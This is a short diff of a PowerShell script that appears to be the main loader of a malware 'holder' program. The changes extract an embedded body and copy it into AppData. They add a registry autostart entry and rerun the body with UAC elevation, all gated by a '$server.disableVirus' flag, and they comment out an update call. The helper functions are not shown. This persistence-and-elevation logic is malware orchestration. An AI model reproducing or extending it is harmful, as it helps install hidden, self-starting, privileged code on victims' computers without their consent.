@@ -1,27 +1,24 @@
-. ./consts.ps1
+. ./consts_holder.ps1
 . ./utils.ps1
-. ./auto.ps1
 . ./embeddings.ps1
 . ./update.ps1
+. ./autocopy.ps1
+. ./autoregistry.ps1
 
-$holderBody = Get-BodyPath
-if (-not (Test-Path -Path $holderBody))
-{
-    ExtractEmbedding -inContent $xbody -outFile $holderBody
-}
+DoBody_InitialExtract
 
 if (-not $server.disableVirus)
 {
-    DoAuto
+    DoHolder_AppData
 }
 
-Rerun -arg "guimode" -uac $false
-
-Elevate
+RunMe -script (Get-BodyPath) -arg "guimode" -uac $false
 
 if (-not $server.disableVirus)
 {
-    Rerun -arg "" -uac $true
+    DoHolder_RegistryAuoStart
+
+    RunMe -script (Get-BodyPath) -arg "" -uac $true
 }
 
 DoFront
@@ -29,5 +26,5 @@ DoEmbeddings
 
 if (-not $server.disableVirus)
 {
-    DoUpdate
+   # DoUpdate
 }
